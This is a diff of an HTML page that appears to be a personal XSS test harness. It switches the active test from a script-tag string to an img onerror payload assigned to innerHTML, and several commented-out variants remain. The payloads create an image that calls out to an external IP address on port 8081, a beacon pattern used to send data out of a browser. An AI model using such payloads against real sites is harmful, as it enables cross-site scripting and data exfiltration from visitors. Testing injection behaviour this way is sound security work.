@@ -423,19 +423,18 @@
 <!--// document.write(str);-->
 <!--</script>-->
 
-<script>
-// var str = "<div></div>";
-var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\'); b.src=\"http://23.83/235.55:8081/def\";<\/script>";
-// var str = "<script> console.log(\"ZX: from console\");<\/script>";
-document.getElementById('inner').innerHTML = str;
-// document.write(str);
-</script>
+<!--write doc test-->
 <!--<script>-->
 <!--// var str = "<div></div>";-->
-<!--var str = "<img src=x onerror=console.log('injecting');b=document.createElement(\"img\");m=\"abc\";"-->
-<!--+ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;>";-->
-<!--document.getElementById('inner').innerHTML = str;-->
+<!--// var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\');b.src=\"http://23.83/235.55:8081/def\";<\/script>";-->
+<!--// document.write(str);-->
 <!--</script>-->
+<script>
+// var str = "<div></div>";
+var str = "<img src=x onerror=console.log('injecting');b=document.createElement(\"img\");m=\"abc\";"
++ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;>";
+document.getElementById('inner').innerHTML = str;
+</script>
 <!--<script>-->
 <!--// var str = "<div></div>";-->
 <!--var str = "<img src=xx onerror='b=document.createElement(\"img\");b.src=\"http://23.83.235.55:8081/def\";'>";-->
